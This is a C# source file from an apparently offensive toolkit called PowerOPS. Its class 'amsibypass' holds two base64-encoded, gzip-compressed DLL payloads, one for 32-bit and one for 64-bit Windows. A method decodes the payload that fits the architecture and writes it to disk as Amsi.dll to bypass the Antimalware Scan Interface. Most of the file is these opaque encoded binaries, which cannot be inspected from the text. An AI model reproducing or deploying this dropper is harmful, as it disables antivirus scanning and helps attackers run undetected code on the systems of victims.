using System;
using System.IO;
using System.IO.Compression;

namespace PowerOPS
{
    class amsibypass
    {
        // (de)compress code from: http://www.herlitz.nu/2011/11/03/compress-a-file-using-gzip-and-convert-it-to-base64-and-back-using-c/

        public static byte[] base64_decode(string encodedData)
        {
            byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
            return encodedDataAsBytes;
        }

        public static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[4096];
                int read;

                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }

                return resultStream.ToArray();
            }
        }

        public static void Amsi(string arch)
        {
            BinaryWriter bw = new BinaryWriter(new FileStream(Directory.GetCurrentDirectory() + "\\Amsi.dll", FileMode.Create));

            string AmsiX86dll = "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";
            string AmsiX64dll = "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";

            //bw = new BinaryWriter(new FileStream(Directory.GetCurrentDirectory() + "\\Amsi.dll", FileMode.Create));

            if (arch == "AMD64")
            {
                byte[] decoded = base64_decode(AmsiX64dll);
                byte[] decompressed = Decompress(decoded);
                bw.Write(decompressed);
            }
            else
            {
                byte[] decoded = base64_decode(AmsiX86dll);
                byte[] decompressed = Decompress(decoded);
                bw.Write(decompressed);
            }

            bw.Close();
        }
    }
}
